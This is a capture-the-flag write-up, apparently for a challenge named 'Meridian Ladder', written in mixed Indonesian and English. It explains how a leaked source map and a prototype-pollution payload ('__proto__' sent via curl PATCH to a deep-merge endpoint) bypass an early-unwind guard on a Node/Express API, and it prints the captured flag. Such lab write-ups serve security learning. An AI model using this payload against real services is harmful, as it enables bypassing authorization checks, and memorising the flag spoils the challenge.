# Meridian Ladder — SOLVED

**Flag:** `athena{IYm3dsklMc3yMd0N}`

- **Target:** `http://13.206.57.188:10041` (instance) — Node/Express, JSON API
- **Vuln:** Prototype Pollution lewat deep-merge di `PATCH /api/preferences`, dipakai buat
  bypass guard "early unwind" pada reserve/treasury ladder.

## Recon
- `/static/app.js.map` masih ada → `sourcesContent` bocorin source TS client:
  - Ladder id = base64url dari `{"t":"ladder","n":N}` (opaque token, di-decode server sama persis).
  - `PATCH /api/preferences` = server **deep-merge** partial patch ke stored settings.
  - Unwind eligibility: `const opts = { ...ladder.policy, ...settings.unwind }`, eligible kalau
    `!frozen && opts.allowEarlyUnwind === true`.
  - Comment: reserve/treasury ladder sengaja **gak punya** `allowEarlyUnwind` di policy →
    *"can never be eligible... Do not add a client-side override for them."* (petunjuk).

## Enumerasi
Ladder di-index by `n`. Generate id `{"t":"ladder","n":N}`, GET `/api/ladder/<id>`:
- n=1 → **House Reserve Ladder**, policy `{tier:"reserve", penaltyBps:0, custodian:"meridian-treasury"}`
  (gak ada `allowEarlyUnwind`), rung T-BILL 5,000,000. ← target.

## Exploit
1. Override biasa `{"unwind":{"allowEarlyUnwind":true}}` → **gagal** (reserve ladder tetap
   `unwindEligible:false`; ada guard yang ngecek policy-nya sendiri, bukan cuma merged opts).
2. Deep-merge rentan prototype pollution. Kirim:
   ```bash
   curl -s -b cookie "http://13.206.57.188:10041/api/preferences" -X PATCH \
     -H 'content-type: application/json' -d '{"__proto__":{"allowEarlyUnwind":true}}'
   ```
   → mem-polusi `Object.prototype.allowEarlyUnwind = true`. Sekarang reserve `ladder.policy`
   "punya" `allowEarlyUnwind` via prototype chain, guard-nya lolos.
3. Recheck: `GET /api/ladder/<n=1>` → `unwindEligible: true`.
4. `POST /api/ladder/<n=1 id>/unwind`:
   ```json
   {"ok":true,"reconciliation":{"ladder":"House Reserve Ladder","tier":"reserve",
    "rungsLiquidated":4,"penaltyBps":0,
    "settlementToken":"athena{IYm3dsklMc3yMd0N}","note":"reserve ladder unwound..."}}
   ```

## Ladder id n=1
`eyJ0IjoibGFkZGVyIiwibiI6MX0`  = base64url(`{"t":"ladder","n":1}`)
